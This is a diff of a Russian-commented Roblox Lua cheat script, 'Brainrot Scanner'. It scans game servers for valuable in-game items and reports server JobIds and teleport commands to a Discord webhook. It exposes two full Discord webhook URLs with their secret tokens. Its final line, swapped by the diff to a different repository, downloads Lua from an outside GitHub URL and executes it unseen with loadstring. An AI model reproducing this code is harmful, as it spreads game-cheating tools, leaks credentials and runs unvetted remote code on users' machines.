@@ -7,74 +7,75 @@ local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
-local INCOME_THRESHOLD = 200_000_000 -- 50M/s минимум для уведомления
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz'
+local INCOME_THRESHOLD = 50_000_000 -- 50M/s минимум для уведомления
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422290103522431048/d2JA2afCOlJXJOVBaEoaAWrx3p6fIxKDw6UvjbIbKDLiwpBZ0H-SZbrG8wthxYXobeJ2'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
 -- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ВАЖНОСТЬЮ
 local OBJECTS = {
-    
+    ['La Vacca Saturno Saturnita'] = { emoji = '🐮', important = false },
+    ['Chimpanzini Spiderini'] = { emoji = '🕷', important = false },
+    ['Los Tralaleritos'] = { emoji = '🐟', important = false },
+    ['Las Tralaleritas'] = { emoji = '🌸', important = false },
+    ['Graipuss Medussi'] = { emoji = '🦑', important = false },
     ['Torrtuginni Dragonfrutini'] = { emoji = '🐉', important = false },
-    ['Pot Hotsp213ot'] = { emoji = '📱', important = false },
-    ['La Grande C3123ombi1nasion'] = { emoji = '❗️', important = false },
-    ['Garama and Madundung'] = { emoji = '🧂', important = true },
+    ['Pot Hotspot'] = { emoji = '📱', important = false },
+    ['La Grande Combinasion'] = { emoji = '❗️', important = true },
+    ['Garama and Madundung'] = { emoji = '🍝', important = true },
     ['Secret Lucksfsfsfy Block'] = { emoji = '⬛️', important = false },
     ['Dragon Cannelloni'] = { emoji = '🐲', important = true },
-    ['Nuclearo Dinos332sauro'] = { emoji = '🦕', important = true },
-    ['Las Vaquitas Satu323rnitas'] = { emoji = '👦', important = false },
-    ['Chicleteira Bici323cl1eteira'] = { emoji = '🚲', important = false },
-    ['Los Combinasi1323onas'] = { emoji = '⚒️', important = false },
-    ['Agarrini la 1Palini'] = { emoji = '🥄', important = false },
-    ['Los Hotsp1otsitos'] = { emoji = '☎️', important = false },
-    ['Esok Se323kolah'] = { emoji = '🏠', important = true },
-    ['Nooo My Hots1pot'] = { emoji = '👽', important = false },
+    ['Nuclearo Dinossauro'] = { emoji = '🦕', important = true },
+    ['Las Vaquitas Saturnitas'] = { emoji = '👦', important = false },
+    ['Agarrini la Palini'] = { emoji = '🥄', important = false },
+    ['Los Hotspotsitos'] = { emoji = '☎️', important = true },
+    ['Esok Sekolah'] = { emoji = '🏠', important = true },
+    ['Nooo My Hotspot'] = { emoji = '👽', important = false },
     ['La Supreme Combinasion'] = { emoji = '🔫', important = true },
-    ['Admin Luck1y Block'] = { emoji = '🆘', important = false },
+    ['Admin Lucky Block'] = { emoji = '🆘', important = false },
     ['Ketupat Kepat'] = { emoji = '🍏', important = true },
     ['Strawberry Elephant'] = { emoji = '🐘', important = true },
-    ['Spaghetti Tualetti'] = { emoji = '🚽', important = false },
+    ['Spaghetti Tualetti'] = { emoji = '🚽', important = true },
     ['Ketchuru and Musturu'] = { emoji = '🍾', important = true },
     ['La Secret Combinasion'] = { emoji = '❓', important = true },
     ['La Kark56656erkar Combinasion'] = { emoji = '🥊', important = false },
-    ['Los B2323ros'] = { emoji = '📱', important = true },
+    ['Los Bros'] = { emoji = '📱', important = true },
     ['Tralaledon'] = { emoji = '🦈', important = true },
     ['La Extinct Grande'] = { emoji = '🩻', important = true },
-    ['Los Chicl1eteiras'] = { emoji = '🚳', important = true },
-    ['Las S233is'] = { emoji = '👧', important = true },
-    ['Tacorita Bicdsdicleta'] = { emoji = '📱', important = true },
+    ['Los Hotspotitos'] = { emoji = '📱', important = true },
+    ['Las Sis'] = { emoji = '👧', important = true },
+    ['Tacorita Bicicleta'] = { emoji = '📱', important = true },
     ['Tictac Sahur'] = { emoji = '🕰️', important = true },
     ['Celularcini Viciosini'] = { emoji = '📞', important = true },
     ['Los Primos'] = { emoji = '🙆‍♂️', important = true },
     ['Tang Tang Keletang'] = { emoji = '📢', important = true },
-    ['Money Money Puggy'] = { emoji = '🐶', important = false },
+    ['Money Money Puggy'] = { emoji = '🐶', important = true },
     ['Burguro And Fryuro'] = { emoji = '🍔', important = true },
     ['Chillin Chili'] = { emoji = '🌶', important = true },
-    ['Eviled323on'] = { emoji = '👹', important = true },
+    ['Eviledon'] = { emoji = '👹', important = true },
     ['La Spooky Grande'] = { emoji = '🟧', important = true },
-    ['Los Mo21bilis'] = { emoji = '🧕', important = false },
+    ['Los Mobilis'] = { emoji = '🧕', important = true },
     ['Spooky and Pumpky'] = { emoji = '🎃', important = true, },
-    ['Mietet11eira Bicicleteira'] = { emoji = '☠️', important = true },
+    ['Mieteteira Bicicleteira'] = { emoji = '☠️', important = true },
     ['Meowl'] = { emoji = '🐈', important = true },
-    ['Chipso and Queso'] = { emoji = '🧀', important = false },
+    ['Chipso and Queso'] = { emoji = '🧀', important = true },
+    ['Chipso And Queso'] = { emoji = '🧀', important = true },
     ['La Casa Boo'] = { emoji = '👁‍🗨', important = true },
     ['Headless Horseman'] = { emoji = '🐴', important = true },
-    ['Los Tacoritas'] = { emoji = '💀', important = true },
+    ['Mariachi Corazoni'] = { emoji = '💀', important = true },
     ['La Taco Combinasion'] = { emoji = '👒', important = true },
+    ['Capitano Moby'] = { emoji = '🚢', important = true },
+    ['Guest 666'] = { emoji = '㊙️', important = true },
     ['Cooki and Milki'] = { emoji = '🍪', important = true },
+    ['Los Puggies'] = { emoji = '🦮', important = true },
     ['Fragrama and Chocrama'] = { emoji = '🍫', important = true },
-    ['Los Spaghettis'] = { emoji = '🍝', important = true },
-    ['Orcaledon'] = { emoji = '🐭', important = true },
-    ['W or L'] = { emoji = '🏆', important = true },
+    ['Los Spaghettis'] = { emoji = '🚾', important = true },
+    ['Los Tacoritas'] = { emoji = '🚴', important = true },
+    ['Orcaledon'] = { emoji = '🐡', important = true },
     ['Lavadorito Spinito'] = { emoji = '📺', important = true },
-    ['Gobblino Uniciclino'] = { emoji = '🕊️', important = false },
-    ['Fishino Clownino'] = { emoji = '🐠', important = true },
-    ['La Ginger Sekolah'] = { emoji = '🎄', important = true },
     ['Los Planitos'] = { emoji = '🪐', important = true },
-    ['Guest 666'] = { emoji = '👿', important = true },
-    ['Capitano Moby'] = { emoji = '🛥️', important = true },
-    
-    
+    ['W or L'] = { emoji = '🟩', important = true },
+    ['Fishino Clownino'] = { emoji = '🤡', important = true },
 }
 
 -- Создаем список важных объектов
@@ -455,12 +456,6 @@ local function sendDiscordNotification(filteredObjects)
         jobId
     )
 
-    -- Кнопка для копирования JobId
-    local copyButtonText = string.format(
-        "📋 Нажмите чтобы скопировать JobId: ```%s```",
-        jobId
-    )
-
     local payload = {
         username = '🎯 Brainrot Scanner',
         embeds = {
@@ -470,7 +465,7 @@ local function sendDiscordNotification(filteredObjects)
                 fields = {
                     {
                         name = '🆔 Сервер (Job ID)',
-                        value = string.format('```%s```', jobId),
+                        value = string.format('``````', jobId),
                         inline = false,
                     },
                     {
@@ -479,13 +474,8 @@ local function sendDiscordNotification(filteredObjects)
                         inline = false,
                     },
                     {
-                        name = '🚀 Телепорт команда:',
+                        name = '🚀 Телепорт:',
                         value = teleportText,
-                        inline = false,
-                    },
-                    {
-                        name = '📋 Скопировать JobId',
-                        value = copyButtonText,
                         inline = false,
                     },
                 },
@@ -586,4 +576,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
